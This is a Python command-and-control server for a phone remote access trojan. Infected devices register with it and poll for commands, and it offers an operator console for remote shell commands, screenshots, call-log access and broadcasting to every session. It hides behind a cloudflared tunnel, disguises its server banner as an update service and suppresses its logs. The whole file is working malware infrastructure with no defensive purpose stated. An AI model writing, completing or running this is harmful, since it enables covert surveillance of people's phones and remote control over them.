#!/usr/bin/env python3
"""
c2_server.py — operator console. http server behind cloudflared.

the phone long-polls /poll for commands and posts to /result.
you drive it from the local CLI.

run:
  python3 c2_server.py --port 8080 --token <TOKEN>
  cloudflared tunnel --url http://localhost:8080
"""

import argparse, json, os, threading, time, uuid
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlparse, parse_qs

LOG_ROOT = Path.home() / "rat_logs"
LOG_ROOT.mkdir(parents=True, exist_ok=True)

TOKEN = ""            # set in main()
SESSIONS: dict[str, "Session"] = {}
SESS_LOCK = threading.Lock()
ACTIVE: "Session|None" = None


def ts(): return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
def color(s, c):
    codes = {"red":"31","green":"32","yellow":"33","blue":"34","magenta":"35","cyan":"36","grey":"90"}
    return f"\033[{codes.get(c,'0')}m{s}\033[0m"


class Session:
    def __init__(self, sid, ip, model):
        self.sid = sid
        self.ip = ip
        self.model = model
        self.connected_at = time.time()
        self.last_seen = time.time()
        self.queue: list[str] = []
        self.qcv = threading.Condition()
        self.alive = True
        self.log_path = LOG_ROOT / f"{sid[:8]}_{ip}_{int(self.connected_at)}.log"
        with open(self.log_path, "a", encoding="utf-8") as f:
            f.write(f"[{ts()}] connect {model} @ {ip}\n")

    def log(self, s: str):
        try:
            with open(self.log_path, "a", encoding="utf-8") as f:
                f.write(s if s.endswith("\n") else s + "\n")
        except Exception: pass

    def push(self, cmd: str):
        with self.qcv:
            self.queue.append(cmd)
            self.qcv.notify_all()
        self.log(f">>> {cmd}")

    def pop(self, timeout: float = 25.0):
        with self.qcv:
            if not self.queue:
                self.qcv.wait(timeout)
            return self.queue.pop(0) if self.queue else None


class Handler(BaseHTTPRequestHandler):
    server_version = "update/1.0"
    def log_message(self, *a): pass  # silent

    def _auth(self) -> bool:
        return self.headers.get("X-Token") == TOKEN

    def _json(self, code: int, obj: dict):
        b = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        try: self.wfile.write(b)
        except Exception: pass

    def do_POST(self):
        if not self._auth(): return self._json(403, {"err":"auth"})
        u = urlparse(self.path)
        n = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(n) if n else b""
        try:
            data = json.loads(body.decode()) if body else {}
        except Exception:
            return self._json(400, {"err":"json"})

        if u.path == "/register":
            sid = uuid.uuid4().hex
            ip = self.client_address[0]
            model = data.get("model", "?")
            s = Session(sid, ip, model)
            with SESS_LOCK: SESSIONS[sid] = s
            global ACTIVE
            if ACTIVE is None: ACTIVE = s
            print(color(f"\n[+] session {sid[:8]} connected: {model} @ {ip}", "cyan"))
            print(prompt(), end="", flush=True)
            return self._json(200, {"sid": sid})

        sid = data.get("sid")
        with SESS_LOCK: s = SESSIONS.get(sid)
        if not s: return self._json(404, {"err":"no session"})
        s.last_seen = time.time()

        if u.path == "/poll":
            cmd = s.pop(timeout=25.0)
            return self._json(200, {"cmd": cmd}) if cmd else self._json(204, {})

        if u.path == "/result":
            out = data.get("out", "")
            s.log(out)
            # only echo to console if it's not for a background session
            if s is ACTIVE:
                print(out, end="" if out.endswith("\n") else "\n", flush=True)
            return self._json(200, {"ok":1})

        return self._json(404, {"err":"unknown"})


def prompt():
    return color(f"[{ACTIVE.sid[:8]}:{ACTIVE.model}]> ", "yellow") if ACTIVE \
        else color("[no-session]> ", "grey")


def dispatch(line: str):
    global ACTIVE
    line = line.strip()
    if not line: return
    p = line.split(None, 1)
    v, a = p[0].lower(), (p[1] if len(p) > 1 else "")

    if v == "help":
        print("""
list               show sessions
use N              select session (prefix ok)
bg                 deselect
all <cmd>          broadcast
kill               drop active
quit               exit
shorthands: calls battery volup voldown volset N shot info shell <cmd>
"""); return
    if v == "quit": os._exit(0)
    if v == "list":
        if not SESSIONS: print(color("[*] none","grey")); return
        print(color(f"{'ID':<10}{'MODEL':<22}{'IP':<16}{'UPTIME':<10}STATE","cyan"))
        now = time.time()
        for s in SESSIONS.values():
            up = int(now - s.connected_at)
            st = "active" if s is ACTIVE else ("alive" if s.alive and now - s.last_seen < 60 else "stale")
            print(f"{s.sid[:8]:<10}{s.model[:21]:<22}{s.ip:<16}{up:<10}{st}")
        return
    if v == "use":
        with SESS_LOCK:
            matches = [s for s in SESSIONS.values() if s.sid.startswith(a)]
        if len(matches) == 1: ACTIVE = matches[0]; print(color(f"[*] active={ACTIVE.sid[:8]}","grey"))
        else: print(color("[!] no unique match","red"))
        return
    if v == "bg": ACTIVE = None; print(color("[*] deselected","grey")); return
    if v == "all":
        for s in SESSIONS.values(): s.push(a)
        print(color(f"[*] broadcast -> {len(SESSIONS)}","grey")); return
    if v == "kill":
        if ACTIVE: ACTIVE.alive = False; print(color(f"[*] killed {ACTIVE.sid[:8]}","grey")); ACTIVE=None
        return
    if ACTIVE is None:
        print(color("[!] no active session","red")); return

    cmd = a if v in ("send","shell") else line
    print(color(f"[-> {ACTIVE.sid[:8]}] {cmd}","grey"))
    ACTIVE.push(cmd)


def main():
    global TOKEN
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--token", required=True)
    a = ap.parse_args()
    TOKEN = a.token

    srv = ThreadingHTTPServer((a.host, a.port), Handler)
    print(color(f"[*] http c2 on {a.host}:{a.port}", "green"))
    print(color("[*] expose with: cloudflared tunnel --url http://localhost:%d" % a.port, "grey"))
    print(color("[*] type 'help' for commands", "grey"))
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        while True:
            try: line = input(prompt())
            except EOFError: break
            dispatch(line)
    except KeyboardInterrupt:
        print("\n[*] bye")


if __name__ == "__main__":
    main()
